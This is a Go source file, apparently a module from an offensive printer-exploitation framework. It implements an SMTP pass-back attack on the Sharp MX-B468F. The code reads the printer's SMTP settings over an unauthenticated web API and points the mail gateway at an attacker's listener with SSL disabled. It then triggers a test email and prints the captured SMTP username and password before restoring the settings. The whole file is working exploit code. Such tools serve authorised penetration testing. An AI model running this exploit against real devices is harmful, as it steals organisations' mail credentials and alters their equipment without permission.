package unsafe

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"papercut/internal/listener"
	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewSharpMXB468PassBack() }) }

// SharpMXB468PassBack implements the Sharp MFP SMTP Pass-Back attack on newer
// Sharp models that use the Lexmark web platform (webglue API) and have no login
// requirement for accessing or modifying SMTP settings.
//
// Category: UNSAFE — modifies saved SMTP settings, then restores them after capture.
// If the tool crashes between save and restore, settings will be left modified.
type SharpMXB468PassBack struct {
	modules.BaseModule
}

func NewSharpMXB468PassBack() *SharpMXB468PassBack {
	m := &SharpMXB468PassBack{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "sharp/smtp/mxb468_passback",
				Description:  "Sharp MX-B468F SMTP Pass-Back — modifies SMTP settings to capture credentials, then restores",
				Manufacturer: "Sharp",
				Category:     "UNSAFE",
				Authors:      []string{"Waffl3ss"},
				Tags:         []string{"smtp", "passback", "credentials", "sharp", "mfp", "email", "noauth", "lexmark"},
				Models:       []string{"MX-B468F"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port"},
				{Name: "LHOST", Default: "", Required: true, Description: "Listening IP for SMTP callback"},
				{Name: "LPORT", Default: "25", Required: false, Description: "Listening port for SMTP callback"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "60", Required: false, Description: "Callback timeout in seconds"},
			{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

// sharpEmailSettings holds the original SMTP settings for backup/restore.
type sharpEmailSettings struct {
	PrimaryGateway      string
	PrimaryPort         string
	SecondaryGateway    string
	SecondaryPort       string
	UseSSLTLS           string // "0"=disabled, "1"=negotiate, "2"=required
	SmtpAuth            string // "0"=none, "1"=login/plain, etc.
	DeviceUserid        string
	ReplyAddress        string
}

// Check — no login is implemented on this device model.
func (s *SharpMXB468PassBack) Check() (*modules.CheckResult, error) {
	if err := s.Validate(); err != nil {
		return nil, err
	}
	rhost := s.Val("RHOST")
	rport := s.Val("RPORT")
	verbose := s.BoolVal("VERBOSE")

	scheme := "http"
	if s.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	output.Warn("No login implemented on this device model — checking SMTP settings access")

	client := s.newHTTPClient()

	// Try to fetch SMTP settings page — if accessible, the device is vulnerable
	settings, err := s.getEmailSettings(client, baseURL, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false,
			Target:  rhost,
			Port:    s.IntVal("RPORT", 80),
			Details: fmt.Sprintf("Cannot access SMTP settings: %v", err),
		}, nil
	}

	details := fmt.Sprintf("SMTP settings accessible without authentication (server: %s:%s, auth: %s)",
		settings.PrimaryGateway, settings.PrimaryPort, s.authTypeString(settings.SmtpAuth))

	return &modules.CheckResult{
		Success: true,
		Target:  rhost,
		Port:    s.IntVal("RPORT", 80),
		Details: details,
	}, nil
}

// Exploit performs the SMTP pass-back: read settings → modify → test → capture → restore.
func (s *SharpMXB468PassBack) Exploit() (*modules.ExploitResult, error) {
	if err := s.Validate(); err != nil {
		return nil, err
	}

	rhost := s.Val("RHOST")
	rport := s.Val("RPORT")
	lhost := s.Val("LHOST")
	lport := s.Val("LPORT")
	verbose := s.BoolVal("VERBOSE")
	timeout := s.IntVal("TIMEOUT", 60)
	portInt := s.IntVal("RPORT", 80)

	scheme := "http"
	if s.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	client := s.newHTTPClient()

	// Step 1: Read current SMTP settings
	output.Info("Reading current SMTP settings from %s:%s...", rhost, rport)

	origSettings, err := s.getEmailSettings(client, baseURL, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to read SMTP settings: %v", err),
		}, nil
	}

	output.Success("Current SMTP: %s:%s (auth: %s, SSL: %s)",
		origSettings.PrimaryGateway, origSettings.PrimaryPort,
		s.authTypeString(origSettings.SmtpAuth), s.sslString(origSettings.UseSSLTLS))

	if verbose {
		output.Info("  Secondary: %s:%s", origSettings.SecondaryGateway, origSettings.SecondaryPort)
		output.Info("  Username: %s", origSettings.DeviceUserid)
		output.Info("  Reply address: %s", origSettings.ReplyAddress)
	}

	if origSettings.SmtpAuth == "0" {
		output.Warn("SMTP Authentication is disabled — no credentials to capture")
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "SMTP Authentication is not enabled",
		}, nil
	}

	// Step 2: Save modified settings (redirect to attacker, disable SSL)
	output.Warn("Saving modified SMTP settings (UNSAFE — will restore after capture)...")

	err = s.saveEmailSettings(client, baseURL, map[string]string{
		"EmailPrimarySmtpGateway":       lhost,
		"EmailPrimarySmtpGatewayPort":   lport,
		"EmailSecondarySmtpGateway":     lhost,
		"EmailSecondarySmtpGatewayPort": lport,
		"EmailUseSslTls":                "0", // Disable SSL
	}, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to save modified settings: %v", err),
		}, nil
	}

	output.Success("SMTP settings modified: %s:%s (SSL disabled)", lhost, lport)

	// From this point on, we MUST restore settings even if something fails
	var exploitResult *modules.ExploitResult

	// Step 3: Start SMTP listener
	smtpAddr := fmt.Sprintf("0.0.0.0:%s", lport)
	output.Info("Starting SMTP listener on 0.0.0.0:%s (redirect target: %s)...", lport, lhost)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	smtpCredsCh := make(chan *listener.SMTPCreds, 1)
	smtpErrCh := make(chan error, 1)

	go func() {
		creds, err := listener.ListenSMTP(ctx, smtpAddr, time.Duration(timeout)*time.Second, verbose)
		if err != nil {
			smtpErrCh <- err
			return
		}
		smtpCredsCh <- creds
	}()

	// Give listener a moment to start
	time.Sleep(500 * time.Millisecond)

	// Step 4: Trigger SMTP test
	output.Info("Triggering SMTP connection test...")

	err = s.triggerTest(client, baseURL, verbose)
	if err != nil {
		output.Error("Failed to trigger test: %v", err)
		exploitResult = &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to trigger SMTP test: %v", err),
		}
	} else {
		output.Info("Waiting for callback (timeout: %ds)...", timeout)

		// Step 5: Wait for credentials
		select {
		case creds := <-smtpCredsCh:
			fmt.Println()
			output.Success("Received SMTP AUTH from %s", creds.SourceIP)
			output.Success("Auth Method: %s", creds.AuthMethod)
			output.Success("Username: %s", creds.Username)
			output.Success("Password: %s", creds.Password)
			exploitResult = &modules.ExploitResult{
				Success: true,
				Target:  rhost,
				Port:    portInt,
				Details: "SMTP credentials captured via pass-back",
				Data:    fmt.Sprintf("Username: %s\nPassword: %s\nAuth: %s", creds.Username, creds.Password, creds.AuthMethod),
			}
		case err := <-smtpErrCh:
			output.Error("SMTP listener: %v", err)
			exploitResult = &modules.ExploitResult{
				Success: false, Target: rhost, Port: portInt,
				Details: fmt.Sprintf("Listener error: %v", err),
			}
		case <-ctx.Done():
			exploitResult = &modules.ExploitResult{
				Success: false, Target: rhost, Port: portInt,
				Details: "Timeout waiting for SMTP callback",
			}
		}
	}

	// Step 6: ALWAYS restore original settings
	output.Info("Restoring original SMTP settings...")

	restoreErr := s.saveEmailSettings(client, baseURL, map[string]string{
		"EmailPrimarySmtpGateway":       origSettings.PrimaryGateway,
		"EmailPrimarySmtpGatewayPort":   origSettings.PrimaryPort,
		"EmailSecondarySmtpGateway":     origSettings.SecondaryGateway,
		"EmailSecondarySmtpGatewayPort": origSettings.SecondaryPort,
		"EmailUseSslTls":                origSettings.UseSSLTLS,
	}, verbose)
	if restoreErr != nil {
		output.Error("FAILED to restore settings: %v", restoreErr)
		output.Error("Manual restore required! Original: %s:%s (SSL: %s)",
			origSettings.PrimaryGateway, origSettings.PrimaryPort, s.sslString(origSettings.UseSSLTLS))
		if exploitResult.Details != "" {
			exploitResult.Details += " | WARNING: settings not restored"
		}
	} else {
		output.Success("Original settings restored")
	}

	return exploitResult, nil
}

func (s *SharpMXB468PassBack) newHTTPClient() *http.Client {
	return &http.Client{
		Timeout:   time.Duration(s.IntVal("TIMEOUT", 60)) * time.Second,
		Transport: modules.NewHTTPTransport(s.Val("PROXY")),
	}
}

// getEmailSettings fetches the email/SMTP settings via the webglue JSON API.
func (s *SharpMXB468PassBack) getEmailSettings(client *http.Client, baseURL string, verbose bool) (*sharpEmailSettings, error) {
	settingsURL := baseURL + "/webglue/content?c=%2FSettings%2FEmail&lang=en"

	req, err := http.NewRequest("GET", settingsURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", "lang=en")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if verbose {
		output.Info("  Settings page received (%d bytes, status: %d)", len(body), resp.StatusCode)
	}

	// JSON-decode the response to get clean HTML (no JSON escape sequences)
	var jsonResp struct {
		HTML string `json:"html"`
	}
	if err := json.Unmarshal(body, &jsonResp); err != nil {
		return nil, fmt.Errorf("invalid JSON response: %w", err)
	}

	html := jsonResp.HTML

	// Parse settings from the decoded HTML
	settings := &sharpEmailSettings{}
	settings.PrimaryGateway = extractSettingValue(html, "16510")
	settings.PrimaryPort = extractSettingValue(html, "16511")
	settings.SecondaryGateway = extractSettingValue(html, "16512")
	settings.SecondaryPort = extractSettingValue(html, "16513")
	settings.UseSSLTLS = extractSelectedValue(html, "17072")
	settings.SmtpAuth = extractSelectedValue(html, "16528")
	settings.DeviceUserid = extractSettingValue(html, "16526")
	settings.ReplyAddress = extractSettingValue(html, "16515")

	if settings.PrimaryGateway == "" && settings.PrimaryPort == "" {
		return nil, fmt.Errorf("could not parse SMTP settings from response — page may require authentication")
	}

	return settings, nil
}

// saveEmailSettings POSTs modified settings to the webglue API.
func (s *SharpMXB468PassBack) saveEmailSettings(client *http.Client, baseURL string, settings map[string]string, verbose bool) error {
	saveURL := baseURL + "/webglue/content"

	// Build JSON data payload
	jsonBytes, err := json.Marshal(settings)
	if err != nil {
		return fmt.Errorf("marshal settings: %w", err)
	}

	formData := url.Values{
		"data": {string(jsonBytes)},
		"c":    {"Email"},
		"lang": {"en"},
	}

	req, err := http.NewRequest("POST", saveURL, strings.NewReader(formData.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", "lang=en")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("save request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read save response: %w", err)
	}

	if verbose {
		output.Info("  Save response (%d bytes): %s", len(body), string(body))
	}

	// Verify the save succeeded — response contains status:0 for each field
	bodyStr := string(body)
	if strings.Contains(bodyStr, `"status":0`) || strings.Contains(bodyStr, `"status": 0`) {
		return nil
	}

	// Check if the response is valid JSON at all
	if resp.StatusCode == 200 && len(body) > 2 {
		return nil // Assume success if 200 and non-empty response
	}

	return fmt.Errorf("unexpected save response (status %d): %s", resp.StatusCode, string(body))
}

// triggerTest fires the SMTP connection test.
func (s *SharpMXB468PassBack) triggerTest(client *http.Client, baseURL string, verbose bool) error {
	testURL := baseURL + "/webglue/testSMTPFromEmail?sendToAddr=test%40test.com"

	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", "lang=en")

	resp, err := client.Do(req)
	if err != nil {
		// May timeout while printer runs test — expected
		if verbose {
			output.Info("  Test request returned error (may be expected): %v", err)
		}
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil // Test was triggered regardless
	}

	if verbose {
		output.Info("  Test response: %s", string(body))
	}

	return nil
}

// extractSettingValue extracts a text/numeric input value by setting ID from decoded HTML.
// Looks for: id="setting_NNNNN" ... value="..."
func extractSettingValue(html, settingID string) string {
	marker := `id="setting_` + settingID + `"`
	idx := strings.Index(html, marker)
	if idx == -1 {
		return ""
	}

	// Search forward for value="..." within reasonable range
	searchArea := html[idx:]
	if len(searchArea) > 500 {
		searchArea = searchArea[:500]
	}

	valMarker := `value="`
	valIdx := strings.Index(searchArea, valMarker)
	if valIdx == -1 {
		return ""
	}

	start := valIdx + len(valMarker)
	end := strings.Index(searchArea[start:], `"`)
	if end == -1 {
		return ""
	}

	return searchArea[start : start+end]
}

// extractSelectedValue extracts the selected option value from a dropdown by setting ID.
// Looks for: id="setting_NNNNN" and the <option> with "selected" attribute.
func extractSelectedValue(html, settingID string) string {
	// Find the select element
	marker := `id="setting_` + settingID + `"`
	idx := strings.Index(html, marker)
	if idx == -1 {
		return ""
	}

	// Search for the selected option within the next ~2000 chars
	searchArea := html[idx:]
	if len(searchArea) > 2000 {
		searchArea = searchArea[:2000]
	}

	// Find "selected" attribute, then get the value of that option
	selIdx := strings.Index(searchArea, "selected")
	if selIdx == -1 {
		return ""
	}

	// Look backward from "selected" for the value attribute of this option
	optionArea := searchArea[:selIdx]
	lastVal := strings.LastIndex(optionArea, `value="`)
	if lastVal == -1 {
		return ""
	}
	start := lastVal + len(`value="`)
	end := strings.Index(optionArea[start:], `"`)
	if end == -1 {
		return ""
	}
	return optionArea[start : start+end]
}

func (s *SharpMXB468PassBack) authTypeString(val string) string {
	switch val {
	case "0":
		return "None"
	case "1":
		return "Login/Plain"
	case "2":
		return "CRAM-MD5"
	case "3":
		return "Digest-MD5"
	case "4":
		return "NTLM"
	case "5":
		return "Kerberos 5"
	default:
		return val
	}
}

func (s *SharpMXB468PassBack) sslString(val string) string {
	switch val {
	case "0":
		return "Disabled"
	case "1":
		return "Negotiate"
	case "2":
		return "Required"
	default:
		return val
	}
}
